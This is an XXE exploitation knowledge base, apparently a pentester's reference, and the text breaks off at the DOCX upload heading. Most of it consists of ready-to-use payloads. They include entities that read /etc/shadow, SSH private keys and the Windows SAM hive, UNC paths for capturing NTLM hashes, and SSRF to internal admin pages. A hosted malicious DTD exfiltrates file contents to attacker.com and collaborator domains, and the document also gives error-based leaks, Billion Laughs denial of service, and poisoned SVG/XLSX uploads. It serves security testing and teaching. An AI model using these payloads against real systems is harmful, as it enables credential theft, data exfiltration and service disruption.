---
title: XXE Exploitation Knowledge Base
excerpt: XXE attack taxonomy, parser behaviour, exploitation model, identification, LFI, SSRF/OOB, error-based, blind XXE, SOAP, file upload, XInclude, PHP wrappers, Java protocols and advanced DTD techniques.
tags: XXE, XML, SSRF, LFI, OOB, DTD, Blind XXE, SOAP
---

# Context of XXE

Many legacy and modern applications rely on the XML format to consume, store and manage data from several sources. Now a days we have other and more efficient ways of processing data as it may be JSON, but due to the inheritance of XML many products still use it extensively. XML supports custom tags, DTD definitions and schema validation which makes it very flexible but also introduces attack surface trough its entity resolution mechanism.

## What is it

An XML External Entity attack is a type of attack against an application that parses non-validated XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Those external entities are defined by the attacker and they can lead to several side effects like data exfiltration, Server-Side Request Forgery (SSRF), denial of service or even, in very specifc scenarios, Remote Code Execution (RCE).
**Example of external entity**:

```XML
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

In this example the attacker is defining the entity "example", assigning the value "Doe" to it and then reflecting it in the "lastName" element.

## Requirements

The XXE attacks requires from the application to accept XML from uncontrolled sources and parse it in an insecure way. Many XML parser by default require the developer to limit their capabilities by setting different flags in the component that uses it.

---

# XXE Taxonomy

The following taxonomy classifies all XXE attack techniques covered in this KB. It serves both as a mental model for understanding how XXE exploitation works and as a navigational index. Techniques are grouped by their primary objective and sorted by difficulty/rarity within each category.

```
XXE ATTACK TAXONOMY
│
├── BY OBJECTIVE
│   ├── Data Exfiltration (read files, configs, secrets)
│   │   ├── [CORE]     Direct LFI ──────────────────── § Core Techniques > LFI
│   │   ├── [CORE]     Error-based exfiltration ────── § Core Techniques > Error-Based Blind XXE
│   │   ├── [CORE]     OOB via malicious DTD ───────── § Core Techniques > OOB Exfiltration
│   │   ├── [ADV]      Local DTD override ──────────── § Advanced > Local System DTD Exploitation
│   │   ├── [ADV]      DNS-based exfiltration ──────── § Advanced > DNS-Based OOB
│   │   └── [ADV]      PHP filter chains ───────────── § Advanced > PHP Wrappers
│   │
│   ├── Internal Reconnaissance (SSRF, service enum)
│   │   ├── [CORE]     SSRF to internal services ──── § Core Techniques > SSRF
│   │   ├── [INT]      SSRF via error messages ─────── § Core Techniques > Error-Based Blind XXE > Bonus
│   │   ├── [ADV]      Java LDAP/RMI SSRF ─────────── § Advanced > Java Protocols
│   │   └── [ADV]      UNC path NTLM capture ──────── § Core Techniques > LFI > Windows
│   │
│   ├── Environment-Specific Escalation (RCE — rare, stack-dependent)
│   │   ├── [ADV]      PHP expect:// wrapper ───────── § Advanced > PHP Wrappers
│   │   └── [ADV]      Java jar:// deserialization ── § Advanced > Java Protocols
│   │
│   └── Denial of Service
│       ├── [CORE]     Billion Laughs ──────────────── § Denial of Service
│       └── [CORE]     Quadratic Blowup ───────────── § Denial of Service
│
├── BY ENTRY POINT
│   ├── [CORE]     REST API (XML body) ─────────────── § Identifying XXE on REST APIs
│   ├── [INT]      SOAP endpoints ──────────────────── § Intermediate > SOAP
│   ├── [INT]      File upload (SVG/XLSX/DOCX) ─────── § Intermediate > File Upload
│   ├── [INT]      Content-Type switching ──────────── § Intermediate > Content-Type Switching
│   ├── [INT]      XInclude injection ──────────────── § Intermediate > XInclude
│   └── [ADV]      RSS/Atom feeds, WebDAV, XSLT ───── (context-dependent)
│
├── BY EXFILTRATION CHANNEL
│   ├── In-band ── response reflects entity content
│   ├── Error-based ── file content leaked in error messages
│   ├── OOB HTTP ── data sent to attacker server via HTTP
│   ├── OOB DNS ── data encoded in DNS queries
│   └── Side-channel ── behavioral differences (timing, status codes)
│
└── DIFFICULTY LEVELS
    ├── [CORE] ── Standard techniques, work on most vulnerable parsers
    ├── [INT]  ── Require specific context (SOAP, file formats, content negotiation)
    └── [ADV]  ── Require specific stack, rare conditions or complex payload crafting
```

**Legend**: `[CORE]` = common, first to try | `[INT]` = intermediate, context-dependent | `[ADV]` = advanced, rare conditions

---

# Parser Behaviour

XXE exists because of how XML parsers handle entity resolution. Understanding parser internals is critical for both exploitation and defense since the vulnerability is not in the XML spec itself but in how parsers implement it.

## How XML Entity Resolution Works

When an XML parser encounters an entity reference like `&xxe;` it needs to resolve it. The resolution process follows these steps:

1. Parser reads the DOCTYPE declaration and processes internal/external DTD subsets
2. Entity declarations are registered (both general entities and parameter entities)
3. When the parser encounters an entity reference in the document body, it looks up the registered entity
4. If the entity has a `SYSTEM` identifier the parser attempts to fetch the resource (file, HTTP, FTP, etc)
5. The fetched content replaces the entity reference in the document

The vulnerability happens at step 4. If the parser resolves external entities without restriction, the attacker controls what resources the server fetches.

## Parameter Entities vs General Entities

There are two types of entities and understanding the difference is important for payload crafting:

**General entities** are declared with `<!ENTITY name "value">` and referenced with `&name;` in the document body. These are the most basic form of XXE.

**Parameter entities** are declared with `<!ENTITY % name "value">` and referenced with `%name;` only within DTD declarations. These are critical for blind XXE because they allow chaining: one entity can define another entity which can define another. This chaining is what makes OOB exfiltration and error-based techniques possible.

## Why Parsers Are (or Were) Vulnerable

Historically, many XML parsers shipped with external entity resolution enabled because the XML specification requires it for full DTD support. The spec was designed in an era where XML documents were trusted and the ability to include external resources was considered a feature not a risk.

In some ecosystems this is still the case. Java parsers in particular remain insecure by default and OWASP still documents that most common Java XML parsers must be explicitly hardened. However, modern runtimes in other languages have improved their defaults considerably: Python's `lxml` has been safe since version 2.x, .NET changed to secure defaults in 4.5.2, PHP requires explicit `LIBXML_NOENT` flag to enable entity substitution, and Ruby's Nokogiri treats documents as untrusted by default.

This means the vulnerability is an opt-out problem in some stacks (Java) but closer to opt-in in others (modern PHP, Python, .NET). The practical implication for pentesting is that the technology stack matters a lot when assessing XXE likelihood. Legacy applications and older framework versions remain the most common targets.

## Parser Behaviour by Language

Different parsers behave differently. Some are vulnerable by default, some require specific flags to become vulnerable, and some have been hardened over time:

| Parser | Language | External Entities | Parameter Entities | DTD Processing | Risk Assessment |
|--------|----------|------------------|--------------------|----------------|-----------------|
| `DocumentBuilderFactory` | Java | ✅ On by default | ✅ On by default | ✅ On | Vulnerable by default — must be hardened explicitly |
| `SAXParserFactory` | Java | ✅ On by default | ✅ On by default | ✅ On | Vulnerable by default — must be hardened explicitly |
| `XMLReader` | Java | ✅ On by default | ✅ On by default | ✅ On | Vulnerable by default — must be hardened explicitly |
| `lxml` (etree) | Python | ❌ Off by default | ❌ Off | ✅ On | Usually safe — secure defaults since 2.x |
| `xml.etree.ElementTree` | Python | ❌ No DTD support | ❌ No | ❌ No | Usually safe — limited parser, relies on expat |
| `xml.dom.minidom` | Python | ⚠️ Depends on expat | ❌ No | ⚠️ Partial | Version-dependent — expat behavior varies |
| `SimpleXML` | PHP | ⚠️ Off unless `LIBXML_NOENT` | ❌ Off | ✅ On | Requires insecure flags — safe unless developer enables it |
| `DOMDocument` | PHP | ⚠️ Off unless `LIBXML_NOENT` | ❌ Off | ✅ On | Requires insecure flags — safe unless developer enables it |
| `XmlDocument` | .NET | ⚠️ Changed across versions | ⚠️ Varies | ✅ On | Version-dependent — < 4.5.2 vulnerable, ≥ 4.5.2 safe unless XmlResolver set |
| `XDocument` | .NET | ❌ Off by default | ❌ Off | ✅ On | Usually safe — since .NET 4.5.2 |
| `Nokogiri` | Ruby | ❌ Off by default | ❌ Off | ✅ On | Usually safe — treats documents as untrusted by default |
| `REXML` | Ruby | ⚠️ Partial support | ❌ No | ⚠️ Partial | Version-dependent — partial and inconsistent support |
| `libxml2` (C) | C/C++ | ⚠️ Off unless flags set | ⚠️ Off unless flags | ✅ On | Requires insecure flags — `XML_PARSE_NOENT` or similar |

Key observations from a pentesting perspective:

- Java parsers are the most consistently vulnerable out of the box. If the target runs Java, XXE should be high on the testing list.
- PHP requires the `LIBXML_NOENT` flag to enable entity substitution. The vulnerability often comes from developers explicitly enabling it or from legacy code that predates current best practices.
- .NET changed defaults in version 4.5.2. Applications running on older .NET frameworks or using custom `XmlResolver` configurations are likely vulnerable.
- Python's `lxml` has been safe by default for years but `xml.dom.minidom` behavior depends on the underlying expat version and configuration.
- Ruby's Nokogiri treats documents as untrusted by default, making XXE unlikely unless the developer overrides this behavior.

## What Happens During Resolution

When a parser resolves `<!ENTITY xxe SYSTEM "file:///etc/passwd">` the sequence is:

1. Parser opens a stream to `file:///etc/passwd`
2. Reads the file content into memory
3. Substitutes the entity reference `&xxe;` with the file content
4. Continues parsing the document with the substituted content

If the file content contains characters that are special in XML (`<`, `>`, `&`) the parser may throw an error because the substituted content breaks the XML structure. This is why techniques like base64 encoding (php://filter), error-based exfiltration and CDATA wrappers exist.

For external HTTP entities the parser makes an HTTP request to the specified URL. The response body replaces the entity. This is the foundation of both SSRF and OOB exfiltration.

## Protocols Supported by Parsers

Not all parsers support the same protocols. This directly affects what techniques are available:

| Protocol | Java | PHP | .NET | Python | Ruby |
|----------|------|-----|------|--------|------|
| `file://` | ✅ | ✅ | ✅ | ✅ | ✅ |
| `http://` | ✅ | ✅ | ✅ | ✅ | ✅ |
| `https://` | ✅ | ✅ | ✅ | ✅ | ✅ |
| `ftp://` | ✅ | ✅ | ⚠️ | ❌ | ❌ |
| `jar://` | ✅ | ❌ | ❌ | ❌ | ❌ |
| `netdoc://` | ⚠️ Some | ❌ | ❌ | ❌ | ❌ |
| `php://` | ❌ | ✅ | ❌ | ❌ | ❌ |
| `expect://` | ❌ | ⚠️ Extension | ❌ | ❌ | ❌ |
| `data://` | ❌ | ✅ | ❌ | ❌ | ❌ |
| `gopher://` | ❌ | ⚠️ Old versions | ❌ | ❌ | ❌ |

Java has the broadest protocol support which is why Java-specific techniques (jar://, netdoc://, LDAP, RMI) exist. PHP has its own set of wrappers (php://, expect://, data://) that are unique to that ecosystem.

---

# XXE Exploitation Model

The following diagram represents the full exploitation model for XXE attacks. It starts from initial detection and branches into different techniques based on what the application allows and how it responds. Use this as a decision map during testing.

<pre>
                            ┌─────────────────────────┐
                            │   APPLICATION ACCEPTS   |
                            │       XML INPUT?        |
                            └────────────┬────────────┘
                                         │ Yes
                            ┌────────────▼────────────┐
                            │    ENTITY PROCESSING     │
                            │       ENABLED?           │
                            │  (Test with basic entity)│
                            └────────────┬────────────┘
                              ┌──────────┼──────────┐
                              │          │          │
                         Reflected   Error Only   Nothing
                              │          │          │
                   ┌──────────▼───┐  ┌───▼──────┐  ┌▼──────────────┐
                   │  IN-BAND XXE │  │ERROR-BASED│  │  BLIND XXE    │
                   │              │  │   XXE     │  │               │
                   └──────┬───────┘  └────┬──────┘  └───────┬───────┘
                          │               │                 │
              ┌───────────┼───────┐       │        ┌────────┼────────┐
              │           │       │       │        │        │        │
         ┌────▼───┐  ┌───▼────┐   │  ┌───▼─────┐   |   ┌────▼────    |
         │  LFI   │  │  SSRF  │   │  │Error msg│   |   │OOB HTTP │   |
         │file:// │  │http:// │   │  │has file  │  │   │to own   │   │
         │        │  │internal│   │  │contents  │  │   │server   │   │
         └───┬────┘  └───┬────┘   │  └────┬─────┘  │   └────┬────┘   │
             │           │        │       │        │        │        │
    ┌────────┼────┐      │        │       │        │   ┌────┼───┐    │
    │        │    │      │        │       │        │   │    │   │    │
  Unix    Windows │   Internal    │    Local DTD   │  Burp  │ HTTP   │
  files   files   │   services    │    override    │  Collab│ lstnr  │
    │     + UNC   │   enum        │    fonts.dtd   │       │         │
    │             │               │    docbook.dtd │       │         │
    │        ┌────▼────────┐      │                │  ┌────▼────┐    │
    │        │Special chars│      │                │  │OOB DNS  │    │
    │        │in file?     │      │                │  │(if HTTP │    │
    │        └──┬──────┬───┘      │                │  │blocked) │    │
    │           │      │          │                │  └─────────┘    │
    │        ┌──▼──┐ ┌─▼──────┐   |                |                 │
    │        │CDATA│ │php://   │  │                │            ┌────▼─────┐
    │        │wrap │ │filter   │  │                │            │SIDE-CHAN │
    │        └─────┘ │base64  │   │                │            │(timing,  │
    │                └────────┘   │                │            │status)   │
    │                             │                │            └──────────┘
    │      ┌──────────────────────┼────────────────┘
    │      │                      │
    │   ┌──▼───────────────────┐  │
    │   │  ENTRY POINT         │  │
    │   │  VARIATIONS          │  │
    │   └──┬───────────────────┘  │
    │      │                      │
    │    ┌─▼───────────┐ ┌────────▼────────┐ ┌──────────────┐
    │    │REST API     │ │File Upload      │ │XInclude      │
    │    │(direct XML) │ │SVG/XLSX/DOCX    │ │(no DOCTYPE)  │
    │    └─────────────┘ └─────────────────┘ └──────────────┘
    │    ┌─────────────┐ ┌─────────────────┐ ┌──────────────┐
    │    │SOAP         │ │Content-Type     │ │RSS/Atom      │
    │    │Body/Header  │ │switching        │ │feeds         │
    │    └─────────────┘ └─────────────────┘ └──────────────┘
    │
    │    ┌──────────────────────────────────────────────────┐
    │    │  LANGUAGE-SPECIFIC TECHNIQUES                    │
    │    ├──────────────────────────────────────────────────┤
    │    │  PHP: expect:// (RCE), php://filter, data://,    │
    │    │       zip://                                     |
    │    │  Java: jar://, netdoc://, LDAP, RMI              │
    │    │  .NET: UNC path NTLM capture                     │
    │    └──────────────────────────────────────────────────┘
    │
    │   ┌──────────────────────────────────────────────────┐
    │   │  DENIAL OF SERVICE                               │
    │   ├──────────────────────────────────────────────────┤
    │   │  Billion Laughs (recursive expansion)            │
    │   │  Quadratic Blowup (repeated references)          │
    │   └──────────────────────────────────────────────────┘
</pre>

---

# Identifying XXE on REST APIs

The only way to properly identify if an application is vulnerable to XXE is by exploiting it. To minimize the risk of information leak and damage de server we can try to either reflect a string coming from external entity or read a harmless file like hosts file.

Some scenarios would require from further testing since the entry point of the attack would not properly reflect our payload in the response. In this kind of scenarios we can rely on errors coming from the application to identify the exploitability.

### Test 1: Simple Entity Reflection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY test "SUCCESS">
]>
<root>
  <data>&test;</data>
</root>
```

The behavior expected with this payload would be that the response contains "SUCCESS" confirming that entity processing is enabled.

### Test 2: File Inclusion (Safe File)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>
  <data>&xxe;</data>
</root>
```

The behavior expected with this payload would be that the response contains the system hostname confirming file read capabilities.

### Test 3: Protocol Error

But if the response does not return anything or it does not contain the expected data we can try to send a malformed entity to trigger a protocol error:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "sdjsd:///etc/passwd"> ]>
<contacts>
  <contact>
    <n>Jean &xxe; Dupont</n>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

In a real exploitation use case, this payload triggered an "Unknown protocol: sdjsd". This is proof enough to infer that the defined external entity "xxe" is being processed by the XML parser.

### Test 4: Malformed URL Error

Additionally, we can also trigger errors by malforming the resource declaration as follows:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "http:/Attacker server"> ]>
<contacts>
  <contact>
    <n>Jean &xxe; Dupont</n>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

In this case we can see that the URL is malformed and in the same real exploitation use case the target application returned "protocol = http host = null" meaning that the entity got properly resolved.

### Test 5: OOB Callback

Another method that may worth trying (but is more noisy than the above mentioned) is to try a basic OOB connection to a server controlled by us. In this scenario we may face some limitations due to possible network restrictions (firewall blocking connections to external sources, SIEM detections, etc):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/callback">
]>
<root>&xxe;</root>
```

### Behavioral Analysis (No Error Output)

The last and most extreme case would be that the application target does not return any error information at all and it does not print the injected entities in the response. In this case we can either try an OOB connection or analyze the application behavior. Let say the target application returns 200 ok with the legitimate request and when trying to exfiltrate the /etc/passwd returns nothing but 200 ok. The most common behavior will be that if the malicious XML triggers an error we see a 500 error. At this step we have to be very careful to avoid errors resulting from XML syntax errors. With a well formed XML structure we can ensure that the errors come from the malicious actions we define.

Pattern to look for:

1. Well-formed benign XML → Returns 200 OK with normal response
2. XML with syntax errors → Returns 500 error
3. XXE with syntax errors → Returns 500 error
4. XXE with valid syntax → Returns 200 OK (but no output)

If you observe this pattern with well-formed XXE payloads, the vulnerability is likely blind XXE. Proceed with local DTD enumeration, error-based exfiltration or OOB data exfiltration.

### Identification Decision Tree

```
Does the application accept XML input?
├─ No → Not vulnerable to XXE (move to other vectors)
└─ Yes
   │
   Does the application parse the XML?
   ├─ No → Not vulnerable to XXE
   └─ Yes
      │
      Can you inject custom XML structures?
      ├─ No → Likely using fixed XML templates (low XXE risk)
      └─ Yes
         │
         Test 1: Submit basic entity
         ┌─────────────────────────────────────┐
         │ <!ENTITY test "value">              │
         │ <root>&test;</root>                 │
         └─────────────────────────────────────┘
         │
         Does "value" appear in response?
         ├─ Yes → Vulnerable to basic XXE → Proceed with LFI/SSRF
         ├─ No → Go to Test 2
         └─ Error response → Vulnerable to error-based XXE
            │
            Test 2: External file entity
            ┌─────────────────────────────────────┐
            │ <!ENTITY xxe SYSTEM                 │
            │   "file:///etc/passwd">             │
            │ <root>&xxe;</root>                  │
            └─────────────────────────────────────┘
            │
            Is /etc/passwd content reflected?
            ├─ Yes → Vulnerable to LFI → Extract sensitive files
            ├─ No → Go to Test 3
            └─ Error with filename → Vulnerable error-based XXE
               │
               Test 3: SSRF test (local service)
               ┌─────────────────────────────────────┐
               │ <!ENTITY xxe SYSTEM                 │
               │   "http://127.0.0.1:8080/">         │
               └─────────────────────────────────────┘
               │
               Does request appear in logs?
               ├─ Yes → Vulnerable to SSRF
               ├─ No → Go to Test 4
               └─ Delayed response → Possible blind XXE
                  │
                  Test 4: OOB callback
                  ┌─────────────────────────────────────┐
                  │ <!ENTITY xxe SYSTEM                 │
                  │   "http://attacker.com/callback">   │
                  └─────────────────────────────────────┘
                  │
                  Did you receive a callback?
                  ├─ Yes → Vulnerable to blind XXE (OOB)
                  ├─ No → Test 5: XInclude
                  └─ Firewall blocking → Try DNS-based OOB
                     │
                     Test 5: XInclude (no DOCTYPE)
                     ┌─────────────────────────────────────┐
                     │ <root xmlns:xi=                     │
                     │   "http://www.w3.org/2001/XInclude">│
                     │   <xi:include href=                 │
                     │     "file:///etc/passwd"            │
                     │     parse="text"/>                  │
                     │ </root>                             │
                     └─────────────────────────────────────┘
                     │
                     Is file content reflected?
                     ├─ Yes → Vulnerable via XInclude
                     ├─ No → Likely NOT vulnerable to XXE
                     └─ DTD-based protections in place
                        Try advanced techniques:
                        - Local DTD enumeration
                        - Error-based exfiltration
                        - Time-based side-channel detection
```

---

# Core Techniques

These are the standard XXE exploitation techniques. They work on most vulnerable parsers and should be the first ones to try.

## Local File Inclusion (LFI)

XML LFI payloads usually result on the application returning the contents of the file requested.

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

In this payload, the entity "xxe" will return the content of the file `/etc/passwd` since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.

### Common Unix/Linux files

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">          <!-- User accounts -->
<!ENTITY xxe SYSTEM "file:///etc/shadow">          <!-- Password hashes (requires root) -->
<!ENTITY xxe SYSTEM "file:///etc/hosts">           <!-- Hostname mappings -->
<!ENTITY xxe SYSTEM "file:///etc/hostname">        <!-- System hostname -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">   <!-- Environment variables -->
<!ENTITY xxe SYSTEM "file:///proc/net/arp">        <!-- ARP table -->
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">  <!-- SSH private keys -->
<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">  <!-- Application logs -->
```

### LFI on Windows

Windows requires different file path syntax and targets different files. Additionally Windows supports UNC paths for network file access which can be exploited to enumerate network shares, force NTLM authentication attempts and capture NTLMv2 hashes:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///\\attacker.com\share\file.txt">
]>
<foo>&xxe;</foo>
```

Windows specific files:

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">    <!-- User hashes (requires SYSTEM) -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SECURITY">  <!-- DPAPI keys (requires SYSTEM) -->
<!ENTITY xxe SYSTEM "file:///C:/boot.ini">                          <!-- Legacy Windows -->
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">       <!-- IIS configuration -->

<!-- UNC path enumeration -->
<!ENTITY xxe SYSTEM "file:///\\192.168.1.100\c$\Windows\System32\drivers\etc\hosts">
<!ENTITY xxe SYSTEM "file:///\\dc.example.com\SYSVOL\example.com\Policies\">
```

Some notes on Windows paths: use forward slashes even on Windows (`file:///C:/path/to/file`) since backslashes are interpreted as escape characters in XML. UNC paths use `file:///\\server\share\file`. Some parsers also support alternate data streams: `file:///C:/path/file.txt:zone.identifier`.

## Server Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

## Out-of-Band (OOB) Exfiltration via Malicious DTDs

One variant of SSRF also leads into OOB attacks when the firewall protection of the affected application is poor. OOB allows the attacker to perform connections to third-party sources (mainly attacker controlled servers) which allows the delivery of malicious content that can interact with the vulnerable server. In some cases where the direct LFI is not possible, the attacker may use this technique to exfiltrate data to some controlled server.

When the application does not reflect XML entity content in its response, direct file inclusion fails. Instead, we leverage the XML parser's ability to fetch external resources and send sensitive data to an attacker-controlled endpoint. This works because many XML parsers allow external entity resolution by default, enabling them to retrieve additional DTDs or resources from remote servers.

**Key Concept:** The parser processes the XML input and resolves entities. If an entity points to an external resource (HTTP, HTTPS, or even FTP), the parser will attempt to fetch it. We exploit this behavior to send data out-of-band.

The core idea is simple:

- Host a **malicious DTD** on an attacker-controlled server.
- Reference this DTD from the vulnerable XML payload.
- Use parameter entities in the malicious DTD to read local files and send their contents via HTTP requests.

**Why parameter entities?** Parameter entities (denoted by `%`) are special entities used in DTDs. They allow us to inject additional declarations dynamically. This is crucial because we need to define new entities that perform the exfiltration logic.

### Step 1: Create a Malicious DTD

On the attacker machine, create a DTD file containing the malicious actions. In this example, the content is designed to read `/etc/passwd`:

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Explanation:**

- `<!ENTITY % file SYSTEM "file:///etc/passwd">` tells the parser to load the contents of `/etc/passwd` into the entity `%file`.
- `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">` creates a new entity declaration inside `%eval`. The `&#x25;` is the escaped form of `%`, required because we are defining a parameter entity inside another entity.
- `%eval;` expands and defines `%exfiltrate`.
- `%exfiltrate;` triggers the HTTP request to the attacker's server, sending the file contents as part of the query string.

**Why escape characters?** XML parsers enforce strict syntax rules. When nesting declarations, `%` must be escaped as `&#x25;` to avoid breaking the DTD structure.

### Step 2: Host the Malicious DTD

Once the malicious DTD is created, host it on a server reachable by the target application. A simple Python HTTP server works:

```bash
python3 -m http.server 80
```

Ensure the server is publicly accessible or reachable from the target environment. If DNS resolution might fail, use an IP address instead of a domain name.

### Step 3: XML Payload to Send to the Affected Application

Send an XML payload that loads the external DTD:

```xml
<!DOCTYPE message [
  <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
  %remote;
]>
<message>bar</message>
```

**Explanation:**

- `<!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">` instructs the parser to fetch the malicious DTD.
- `%remote;` expands the content of the malicious DTD, executing the exfiltration logic.

**Tip:** Use an IP address if DNS resolution is unreliable. Ensure the protocol (HTTP/HTTPS) matches what the target can access.

### Step 4: Monitor OOB Interaction

Use Burp Collaborator or a custom HTTP listener to capture the incoming request. Burp Collaborator provides a unique domain that logs all interactions, making it easy to confirm exploitation.

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

When the parser processes this, you should see an HTTP request to your Collaborator domain with the contents of `/etc/passwd` in the query string.

[What is a blind XXE attack? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/xxe/blind)

## Error-Based Blind XXE

There are many ways to exfiltrate data using **XXE (XML External Entity)** attacks. However, in some cases, the most common techniques, such as directly including file contents in the XML response, are not enough to successfully read sensitive files. This often happens when the application's default behavior only prints **error-related information** instead of the actual file content.

For example, if the application returns error messages like these:

```json
{
  "REDACTED": "REDACTED",
  "errorMessage": "/etc/invalid-file (No such file or directory)"
}
```  

```json
{
  "REDACTED": "REDACTED",
  "errorMessage": "/etc/shadow (Permission denied)"
}
```

This indicates that the XML parser is attempting to access the specified files and reporting filesystem errors. If we can trigger these errors, we can use them to **enumerate the filesystem** checking which files exist and which do not.

The simplest error-based payload references a non-existent file concatenated with the target file content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>">
  %eval;
  %error;
]>
<foo></foo>
```

When the parser expands `%error` it attempts to resolve the invalid path triggering an error message that includes the contents of `/etc/passwd`:

```
errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"
```

### Bonus track

The same way we can read files by attaching its content to the error message, we can twist the payload a little bit to enumerate other internal services. In stead of defining `file:///etc/passwd` we can define connections to internal resources and read the responses from it (for example an admin dashboard hosted in <http://localhost:8080>):

```xml
<!ENTITY % file SYSTEM "http://localhost:8080/admin/dashboard">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'>">
%eval;
%error;
```

## Denial of Service

XML has a feature that allows to expand entities in a recursive way by referencing them in loop. While this cannot be considered an external entity attack, worth mentioning it due to the impact that may cause in the application. If the parser is not well configured those entities will kept being called until the application consume their resources. The most famous resource exhaustion attack is the Billion Laughs DoS. While this attack is mostly mitigated in modern XML parsers, it provides very useful context on how XML works.

```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE laugh [
    <!ELEMENT laugh ANY>
    <!ENTITY LOL "LOL">
    <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
    <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
    <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
]>
<laugh>&LOL3;</laugh>
```

Above payload makes the XML parser to expands each of the entities, generating a large number of "LOLs". Above payload would generate hundred of thousands "LOL" strings but a full scale payload would generate literally "Billions" of "LOL" strings.

Simpler variant (Quadratic Blowup):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "xxxxxxxxxxxxxxxx">
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>
```

Both attacks cause memory exhaustion, CPU exhaustion, disk exhaustion and denial of service.

---

# Intermediate Techniques

These techniques require specific context to work: a particular entry point (SOAP, file upload), a specific parser behavior (XInclude support) or a misconfiguration in content negotiation. They are not rare but they depend on the target environment.

## XXE via File Upload

Many file formats that look harmless actually use XML internally and if the server parses them with a vulnerable parser we can inject our payloads.

### SVG File Upload

SVG files are XML-based and are often processed by image handling libraries.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Save as `malicious.svg` and upload. If the application processes SVG files with a vulnerable XML parser, the entity may be reflected in rendered image metadata, server-side image generation output or error messages.

### XLSX (Excel) File Upload

XLSX files are ZIP archives containing XML files. The attack involves extracting, injecting and repackaging.

**Step 1:** Extract:

```bash
unzip document.xlsx -d xlsx_extracted/
```

**Step 2:** Modify `xl/workbook.xml` or `xl/worksheets/sheet1.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE workbook [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
  <text>&xxe;</text>
</workbook>
```

**Step 3:** Repackage:

```bash
cd xlsx_extracted
zip -r ../malicious.xlsx *
cd ..
```

**Step 4:** Upload and monitor.

### DOCX (Word Document) File Upload

